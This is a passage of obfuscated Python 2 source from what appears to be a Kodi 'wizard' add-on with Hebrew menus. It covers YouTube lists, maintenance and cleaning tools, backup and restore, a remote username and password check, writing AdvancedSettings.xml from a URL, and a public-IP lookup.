	if os .path .exists (O00O0OOO0OO00OO00 ):#line:2416
		try :#line:2417
			O0O0OO000OOO0OOO0 =open (O00O0OOO0OO00OO00 ,mode ='r');OO000OO0O00O00O0O =O0O0OO000OOO0OOO0 .read ();O0O0OO000OOO0OOO0 .close ()#line:2418
			O0O0OOO0000O0O0OO =wiz .parseDOM (OO000OO0O00O00O0O ,'addon',ret ='name',attrs ={'id':O0OO0O00O0O0O0O0O })#line:2419
			O00O00O0O000O00O0 =os .path .join (ADDONS ,O0OO0O00O0O0O0O0O ,'icon.png')#line:2420
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0O0OOO0000O0O0OO [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',O00O00O0O000O00O0 )#line:2421
		except :pass #line:2422
def youtubeMenu (url =None ):#line:2424
	if not YOUTUBEFILE =='http://':#line:2425
		if url ==None :#line:2426
			O0OO00OO00O000OO0 =wiz .workingURL (YOUTUBEFILE )#line:2427
			O000O00OOOO0O0000 =uservar .YOUTUBEFILE #line:2428
		else :#line:2429
			O0OO00OO00O000OO0 =wiz .workingURL (url )#line:2430
			O000O00OOOO0O0000 =url #line:2431
		if O0OO00OO00O000OO0 ==True :#line:2432
			O0000000OOO0OO00O =wiz .openURL (O000O00OOOO0O0000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2433
			OO0O0O0O0O0O0O000 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0000000OOO0OO00O )#line:2434
			if len (OO0O0O0O0O0O0O000 )>0 :#line:2435
				for O000O0O00O0000OO0 ,OO0OOO0OO0OO00O00 ,url ,OO00O00OO0000O00O ,OO0OO0OOOO0O0OO00 ,O0O00OO0O0OOO0OOO in OO0O0O0O0O0O0O000 :#line:2436
					if OO0OOO0OO0OO00O00 .lower ()=="yes":#line:2437
						addDir ("[B]%s[/B]"%O000O0O00O0000OO0 ,'youtube',url ,description =O0O00OO0O0OOO0OOO ,icon =OO00O00OO0000O00O ,fanart =OO0OO0OOOO0O0OO00 ,themeit =THEME3 )#line:2438
					else :#line:2439
						addFile (O000O0O00O0000OO0 ,'viewVideo',url =url ,description =O0O00OO0O0OOO0OOO ,icon =OO00O00OO0000O00O ,fanart =OO0OO0OOOO0O0OO00 ,themeit =THEME2 )#line:2440
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:2441
		else :#line:2442
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:2443
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2444
			addFile ('%s'%O0OO00OO00O000OO0 ,'',themeit =THEME3 )#line:2445
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:2446
	setView ('files','viewType')#line:2447
def STARTP ():#line:2448
	OOOOOOO0O0000000O =(ADDON .getSetting ("pass"))#line:2449
	if BUILDNAME =="":#line:2450
	 if not NOTIFY =='true':#line:2451
          O00O00OOO0O0OOO0O =wiz .workingURL (NOTIFICATION )#line:2452
	 if not NOTIFY2 =='true':#line:2453
          O00O00OOO0O0OOO0O =wiz .workingURL (NOTIFICATION2 )#line:2454
	 if not NOTIFY3 =='true':#line:2455
          O00O00OOO0O0OOO0O =wiz .workingURL (NOTIFICATION3 )#line:2456
	O0O00O00OO0O0OOO0 =OOOOOOO0O0000000O #line:2457
	O00O00OOO0O0OOO0O =urllib2 .Request (SPEED )#line:2458
	O000OOOO000OOO00O =urllib2 .urlopen (O00O00OOO0O0OOO0O )#line:2459
	O0OO0O000OO0O0000 =O000OOOO000OOO00O .readlines ()#line:2461
	O00OOOOOOO0OOOO0O =0 #line:2465
	for O00OOOOO0000OOO00 in O0OO0O000OO0O0000 :#line:2466
		if O00OOOOO0000OOO00 .split (' ==')[0 ]==OOOOOOO0O0000000O or O00OOOOO0000OOO00 .split ()[0 ]==OOOOOOO0O0000000O :#line:2467
			O00OOOOOOO0OOOO0O =1 #line:2468
			break #line:2469
	if O00OOOOOOO0OOOO0O ==0 :#line:2470
					OOOO00OOO0O00OOOO =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2471
					if OOOO00OOO0O00OOOO :#line:2473
						ADDON .openSettings ()#line:2475
						STARTP ()#line:2476
						sys .exit ()#line:2477
					else :#line:2478
						sys .exit ()#line:2479
	return 'ok'#line:2483
def STARTP2 ():#line:2484
	OO0O0OOO00OO00O0O =(ADDON .getSetting ("user"))#line:2485
	O0O00OO000OO00O0O =(UNAME )#line:2487
	OO0OO0O0OO000O00O =urllib2 .urlopen (O0O00OO000OO00O0O )#line:2488
	OOOOO00O0O000OOO0 =OO0OO0O0OO000O00O .readlines ()#line:2489
	OOO00O00OOOO0O0O0 =0 #line:2490
	for O00OO0O000OOOOOO0 in OOOOO00O0O000OOO0 :#line:2493
		if O00OO0O000OOOOOO0 .split (' ==')[0 ]==OO0O0OOO00OO00O0O or O00OO0O000OOOOOO0 .split ()[0 ]==OO0O0OOO00OO00O0O :#line:2494
			OOO00O00OOOO0O0O0 =1 #line:2495
			break #line:2496
	if OOO00O00OOOO0O0O0 ==0 :#line:2497
		O00OO0OOOOO0OO00O =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2498
		if O00OO0OOOOO0OO00O :#line:2500
			ADDON .openSettings ()#line:2502
			STARTP2 ()#line:2504
			sys .exit ()#line:2505
		else :#line:2506
			sys .exit ()#line:2507
	return 'ok'#line:2511
def passandpin ():#line:2512
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:2513
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:2514
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:2515
def passandUsername ():#line:2516
	ADDON .openSettings ()#line:2517
def folderback ():#line:2520
    OOOO00OOO000OOOO0 =ADDON .getSetting ("path")#line:2521
    if OOOO00OOO000OOOO0 :#line:2522
      OOOO00OOO000OOOO0 =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:2523
      ADDON .setSetting ("path",OOOO00OOO000OOOO0 )#line:2524
def backmyupbuild ():#line:2527
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2531
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2532
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2533
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2535
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2536
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2537
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2539
def maintMenu (view =None ):#line:2543
	OO0OO0OOO0O0OOO00 ='[B][COLOR green]ON[/COLOR][/B]';OO0OO00OOO0O0O000 ='[B][COLOR red]OFF[/COLOR][/B]'#line:2545
	OO0000OOO00OO00OO ='true'if AUTOCLEANUP =='true'else 'false'#line:2546
	OOOO00OO00OOO0OO0 ='true'if AUTOCACHE =='true'else 'false'#line:2547
	O000OO0O0OO00OO00 ='true'if AUTOPACKAGES =='true'else 'false'#line:2548
	O0OOOOOO00000O00O ='true'if AUTOTHUMBS =='true'else 'false'#line:2549
	OOO0OO0O000O000O0 ='true'if SHOWMAINT =='true'else 'false'#line:2550
	O0000OOOOO00000OO ='true'if INCLUDEVIDEO =='true'else 'false'#line:2551
	O0OOO00O00O000O0O ='true'if INCLUDEALL =='true'else 'false'#line:2552
	O00O000O0000OOO00 ='true'if THIRDPARTY =='true'else 'false'#line:2553
	if wiz .Grab_Log (True )==False :OO0OO0000OOOOO000 =0 #line:2554
	else :OO0OO0000OOOOO000 =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2555
	if wiz .Grab_Log (True ,True )==False :O0O0O0000O0O0O000 =0 #line:2556
	else :O0O0O0000O0O0O000 =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2557
	O000O00O00O00O0O0 =int (OO0OO0000OOOOO000 )+int (O0O0O0000O0O0O000 )#line:2558
	O0O0OOOO0000O0O0O =str (O000O00O00O00O0O0 )+' Error(s) Found'if O000O00O00O00O0O0 >0 else 'None Found'#line:2559
	O0O00O00000O0O0O0 =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2560
	if O0OOO00O00O000O0O =='true':#line:2561
		O0O00000OOOOO0O00 ='true'#line:2562
		OOOO00OO00OO000O0 ='true'#line:2563
		O0O0O00OO000000O0 ='true'#line:2564
		OOOOOOO00O0OO0OO0 ='true'#line:2565
		OO0O0OO000OO000O0 ='true'#line:2566
		O0000OOO000O0000O ='true'#line:2567
		OO00O00OOOOOO0O0O ='true'#line:2568
		O0OOO00OO00O0OOO0 ='true'#line:2569
	else :#line:2570
		O0O00000OOOOO0O00 ='true'if INCLUDEBOB =='true'else 'false'#line:2571
		OOOO00OO00OO000O0 ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2572
		O0O0O00OO000000O0 ='true'if INCLUDESPECTO =='true'else 'false'#line:2573
		OOOOOOO00O0OO0OO0 ='true'if INCLUDEGENESIS =='true'else 'false'#line:2574
		OO0O0OO000OO000O0 ='true'if INCLUDEEXODUS =='true'else 'false'#line:2575
		O0000OOO000O0000O ='true'if INCLUDEONECHAN =='true'else 'false'#line:2576
		OO00O00OOOOOO0O0O ='true'if INCLUDESALTS =='true'else 'false'#line:2577
		O0OOO00OO00O0OOO0 ='true'if INCLUDESALTSHD =='true'else 'false'#line:2578
	OO0OOO000OOOO0000 =wiz .getSize (PACKAGES )#line:2579
	O0000O0OOO0O0O0O0 =wiz .getSize (THUMBS )#line:2580
	O000O0O00O000O0O0 =wiz .getCacheSize ()#line:2581
	O0O00OOO0OO00O0O0 =OO0OOO000OOOO0000 +O0000O0OOO0O0O0O0 +O000O0O00O000O0O0 #line:2582
	O00OO000OO0O0O000 =['Daily','Always','3 Days','Weekly']#line:2583
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2584
	if view =="clean"or SHOWMAINT =='true':#line:2585
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0O00OOO0OO00O0O0 ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2586
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O000O0O00O000O0O0 ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2587
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO0OOO000OOOO0000 ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2588
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0000O0OOO0O0O0O0 ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2589
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2590
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2591
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2592
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2593
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2594
	if view =="addon"or SHOWMAINT =='false':#line:2595
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2596
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2597
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2598
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2599
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2600
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2601
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2602
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2603
	if view =="misc"or SHOWMAINT =='true':#line:2604
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2605
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2606
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2607
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2608
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2609
		addFile ('View Errors in Log: %s'%(O0O0OOOO0000O0O0O ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2610
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2611
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2612
		addFile ('Clear Wizard Log File%s'%O0O00O00000O0O0O0 ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2613
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2614
	if view =="backup"or SHOWMAINT =='true':#line:2615
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2616
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2617
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2618
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2619
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2620
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2621
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2622
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2623
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2624
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2625
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2626
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2627
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2628
	if view =="tweaks"or SHOWMAINT =='true':#line:2629
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2630
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2631
		else :#line:2632
			if os .path .exists (ADVANCED ):#line:2633
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2634
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2635
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2636
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2637
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2638
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2639
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2640
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2641
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2642
	addFile ('Show All Maintenance: %s'%OOO0OO0O000O000O0 .replace ('true',OO0OO0OOO0O0OOO00 ).replace ('false',OO0OO00OOO0O0O000 ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2643
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2644
	addFile ('Third Party Wizards: %s'%O00O000O0000OOO00 .replace ('true',OO0OO0OOO0O0OOO00 ).replace ('false',OO0OO00OOO0O0O000 ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2645
	if O00O000O0000OOO00 =='true':#line:2646
		OO0O0O000O000000O =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2647
		OOOO0O0OOOO000000 =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2648
		O0OOO0000OOO0000O =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2649
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OO0O0O000O000000O ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2650
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOOO0O0OOOO000000 ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2651
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O0OOO0000OOO0000O ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2652
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2653
	addFile ('ניקוי אוטומטי בהפעלה: %s'%OO0000OOO00OO00OO .replace ('true',OO0OO0OOO0O0OOO00 ).replace ('false',OO0OO00OOO0O0O000 ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2654
	if OO0000OOO00OO00OO =='true':#line:2655
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%O00OO000OO0O0O000 [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2656
		addFile ('--- ניקוי קאש בהפעלה: %s'%OOOO00OO00OOO0OO0 .replace ('true',OO0OO0OOO0O0OOO00 ).replace ('false',OO0OO00OOO0O0O000 ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2657
		addFile ('--- ניקוי חבילות בהפעלה: %s'%O000OO0O0OO00OO00 .replace ('true',OO0OO0OOO0O0OOO00 ).replace ('false',OO0OO00OOO0O0O000 ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2658
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%O0OOOOOO00000O00O .replace ('true',OO0OO0OOO0O0OOO00 ).replace ('false',OO0OO00OOO0O0O000 ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2659
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2660
	addFile ('Include Video Cache in Clear Cache: %s'%O0000OOOOO00000OO .replace ('true',OO0OO0OOO0O0OOO00 ).replace ('false',OO0OO00OOO0O0O000 ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2661
	if O0000OOOOO00000OO =='true':#line:2662
		addFile ('--- Include All Video Addons: %s'%O0OOO00O00O000O0O .replace ('true',OO0OO0OOO0O0OOO00 ).replace ('false',OO0OO00OOO0O0O000 ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2663
		addFile ('--- Include Bob: %s'%O0O00000OOOOO0O00 .replace ('true',OO0OO0OOO0O0OOO00 ).replace ('false',OO0OO00OOO0O0O000 ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2664
		addFile ('--- Include Phoenix: %s'%OOOO00OO00OO000O0 .replace ('true',OO0OO0OOO0O0OOO00 ).replace ('false',OO0OO00OOO0O0O000 ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2665
		addFile ('--- Include Specto: %s'%O0O0O00OO000000O0 .replace ('true',OO0OO0OOO0O0OOO00 ).replace ('false',OO0OO00OOO0O0O000 ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2666
		addFile ('--- Include Exodus: %s'%OO0O0OO000OO000O0 .replace ('true',OO0OO0OOO0O0OOO00 ).replace ('false',OO0OO00OOO0O0O000 ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2667
		addFile ('--- Include Salts: %s'%OO00O00OOOOOO0O0O .replace ('true',OO0OO0OOO0O0OOO00 ).replace ('false',OO0OO00OOO0O0O000 ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2668
		addFile ('--- Include Salts HD Lite: %s'%O0OOO00OO00O0OOO0 .replace ('true',OO0OO0OOO0O0OOO00 ).replace ('false',OO0OO00OOO0O0O000 ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2669
		addFile ('--- Include One Channel: %s'%O0000OOO000O0000O .replace ('true',OO0OO0OOO0O0OOO00 ).replace ('false',OO0OO00OOO0O0O000 ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2670
		addFile ('--- Include Genesis: %s'%OOOOOOO00O0OO0OO0 .replace ('true',OO0OO0OOO0O0OOO00 ).replace ('false',OO0OO00OOO0O0O000 ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2671
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2672
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2673
	setView ('files','viewType')#line:2674
def advancedWindow (url =None ):#line:2676
	if not ADVANCEDFILE =='http://':#line:2677
		if url ==None :#line:2678
			OOOO0O00O00O000O0 =wiz .workingURL (ADVANCEDFILE )#line:2679
			OO0OOOO0O0OOO0O00 =uservar .ADVANCEDFILE #line:2680
		else :#line:2681
			OOOO0O00O00O000O0 =wiz .workingURL (url )#line:2682
			OO0OOOO0O0OOO0O00 =url #line:2683
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2684
		if os .path .exists (ADVANCED ):#line:2685
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2686
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2687
		if OOOO0O00O00O000O0 ==True :#line:2688
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2689
			OOO0OO0OOOOO00O00 =wiz .openURL (OO0OOOO0O0OOO0O00 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2690
			OOOOOO00O000O0O0O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OOO0OO0OOOOO00O00 )#line:2691
			if len (OOOOOO00O000O0O0O )>0 :#line:2692
				for OO0O0OOOO0000OO00 ,O0OOOOO0OOO0O0O00 ,url ,O000O0OOO0OO00OOO ,OO00OOO0000OO0O0O ,O00O0O0O0OOOO00OO in OOOOOO00O000O0O0O :#line:2693
					if O0OOOOO0OOO0O0O00 .lower ()=="yes":#line:2694
						addDir ("[B]%s[/B]"%OO0O0OOOO0000OO00 ,'advancedsetting',url ,description =O00O0O0O0OOOO00OO ,icon =O000O0OOO0OO00OOO ,fanart =OO00OOO0000OO0O0O ,themeit =THEME3 )#line:2695
					else :#line:2696
						addFile (OO0O0OOOO0000OO00 ,'writeadvanced',OO0O0OOOO0000OO00 ,url ,description =O00O0O0O0OOOO00OO ,icon =O000O0OOO0OO00OOO ,fanart =OO00OOO0000OO0O0O ,themeit =THEME2 )#line:2697
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2698
		else :wiz .log ("[Advanced Settings] URL not working: %s"%OOOO0O00O00O000O0 )#line:2699
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2700
def writeAdvanced (O00O000OOOO0O000O ,O0O0O0OO0000O0O0O ):#line:2702
	O0O0O0O000OOO00OO =wiz .workingURL (O0O0O0OO0000O0O0O )#line:2703
	if O0O0O0O000OOO00OO ==True :#line:2704
		if os .path .exists (ADVANCED ):O00OO00O0000OOO00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O00O000OOOO0O000O ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2705
		else :O00OO00O0000OOO00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O00O000OOOO0O000O ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2706
		if O00OO00O0000OOO00 ==1 :#line:2708
			O00O00OOO00OOOO00 =wiz .openURL (O0O0O0OO0000O0O0O )#line:2709
			O0O000O0OOOO0O00O =open (ADVANCED ,'w');#line:2710
			O0O000O0OOOO0O00O .write (O00O00OOO00OOOO00 )#line:2711
			O0O000O0OOOO0O00O .close ()#line:2712
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2713
			wiz .killxbmc (True )#line:2714
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2715
	else :wiz .log ("[Advanced Settings] URL not working: %s"%O0O0O0O000OOO00OO );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2716
def viewAdvanced ():#line:2718
	O000OOOOO00OOOOOO =open (ADVANCED )#line:2719
	OOO0000000OO00O00 =O000OOOOO00OOOOOO .read ().replace ('\t','    ')#line:2720
	wiz .TextBox (ADDONTITLE ,OOO0000000OO00O00 )#line:2721
	O000OOOOO00OOOOOO .close ()#line:2722
def removeAdvanced ():#line:2724
	if os .path .exists (ADVANCED ):#line:2725
		wiz .removeFile (ADVANCED )#line:2726
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2727
def showAutoAdvanced ():#line:2729
	notify .autoConfig ()#line:2730
def getIP ():#line:2732
	OOO00O0O00OOO00O0 ='http://whatismyipaddress.com/'#line:2733
	if not wiz .workingURL (OOO00O0O00OOO00O0 ):return 'Unknown','Unknown','Unknown'#line:2734
	O00OO0O0OO0O0O0O0 =wiz .openURL (OOO00O0O00OOO00O0 ).replace ('\n','').replace ('\r','')#line:2735
	if not 'Access Denied'in O00OO0O0OO0O0O0O0 :#line:2736
		O00OO0O0O00OO0O0O =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (O00OO0O0OO0O0O0O0 )#line:2737
		O0000OO0000O000OO =O00OO0O0O00OO0O0O [0 ]if (len (O00OO0O0O00OO0O0O )>0 )else 'Unknown'#line:2738
		O000OO0OOOOOOOOOO =re .compile ('"font-size:14px;">(.+?)</td>').findall (O00OO0O0OO0O0O0O0 )#line:2739
		OO00000000O00O000 =O000OO0OOOOOOOOOO [0 ]if (len (O000OO0OOOOOOOOOO )>0 )else 'Unknown'#line:2740
		O000O0O0O00O0O00O =O000OO0OOOOOOOOOO [1 ]+', '+O000OO0OOOOOOOOOO [2 ]+', '+O000OO0OOOOOOOOOO [3 ]if (len (O000OO0OOOOOOOOOO )>2 )else 'Unknown'#line:2741
		return O0000OO0000O000OO ,OO00000000O00O000 ,O000O0O0O00O0O00O #line:2742
	else :return 'Unknown','Unknown','Unknown'#line:2743
def systemInfo ():#line:2745
